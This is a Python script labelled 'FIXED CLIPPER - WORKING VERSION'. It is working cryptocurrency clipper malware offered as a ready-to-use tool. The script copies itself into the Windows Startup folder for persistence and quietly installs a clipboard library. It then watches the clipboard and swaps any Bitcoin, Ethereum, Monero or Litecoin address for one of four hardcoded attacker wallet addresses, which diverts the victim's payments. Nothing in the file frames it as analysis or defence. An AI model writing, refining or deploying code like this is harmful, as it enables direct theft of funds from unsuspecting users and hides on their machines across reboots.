#!/usr/bin/env python3
"""
FIXED CLIPPER - WORKING VERSION
Fixed startup persistence and improved reliability
"""

import os
import time
import re
import shutil
import sys

# Install pyperclip if not present
try:
    import pyperclip as pc
except ImportError:
    os.system("pip install pyperclip >nul 2>&1")
    import pyperclip as pc

# Wallet addresses
BTC_address = "1Jn8rqrjaz8N6jPSZ5mNHk9nhwaLJszPwm"
ETH_address = "0x71Ab21b1b9DfEea3966fDF10674b2CF2824Bcc6E"
MON_address = "49qHPyAuZakhaiw9qXnaXVDWVMr97vepmPrRjsv8en43S25HdqpSMyvZhZbF9273DUaBHD6hJrffD687ewew4PENPxKmMch"
LTC_address = "LYziN7XTsR3Zq6UA3yQw2J8q33Qa3gqjSy"

def add_to_startup():
    """Fixed startup persistence"""
    try:
        user = os.getlogin()
        current_file = sys.argv[0]  # Get current script path
        basename = os.path.basename(current_file)
        current_dir = os.path.dirname(current_file)
        
        # Full source path
        src_path = os.path.join(current_dir, basename)
        
        # Destination startup path
        startup_dir = f'C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
        dst_path = os.path.join(startup_dir, basename)
        
        # Copy to startup if not already there
        if not os.path.exists(dst_path):
            shutil.copy2(src_path, dst_path)
            print(f"✅ Added to startup: {basename}")
        else:
            print(f"⚠️ Already in startup: {basename}")
            
    except Exception as e:
        print(f"❌ Startup error: {e}")

def clip():
    """Clipboard monitoring function"""
    try:
        s = str(pc.paste())
        
        # Crypto address detection
        btc_check = re.match(r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", s)
        eth_check = re.match(r"^0x[a-zA-F0-9]{40}$", s)
        mon_check = re.match(r"^4([0-9]|[A-B])(.){93}$", s)
        ltc_check = re.match(r"[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$", s)
        
        time.sleep(0.1)  # Reduced delay for faster response
        
        if btc_check:
            pc.copy(BTC_address)
            print(f"✅ Replaced BTC: {s[:20]}... -> {BTC_address}")
        elif eth_check:
            pc.copy(ETH_address)
            print(f"✅ Replaced ETH: {s[:20]}... -> {ETH_address}")
        elif mon_check:
            pc.copy(MON_address)
            print(f"✅ Replaced XMR: {s[:20]}... -> {MON_address}")
        elif ltc_check:
            pc.copy(LTC_address)
            print(f"✅ Replaced LTC: {s[:20]}... -> {LTC_address}")
            
    except Exception as e:
        print(f"❌ Clipboard error: {e}")

def main():
    """Main execution"""
    print("🚀 Crypto Clipper Started")
    print("=" * 40)
    
    # Add to startup
    add_to_startup()
    
    print("📋 Monitoring clipboard...")
    print("Press Ctrl+C to stop")
    print("-" * 40)
    
    # Main loop
    try:
        while True:
            clip()
            time.sleep(0.5)  # Check every 0.5 seconds
    except KeyboardInterrupt:
        print("\n🛑 Clipper stopped by user")

if __name__ == "__main__":
    main()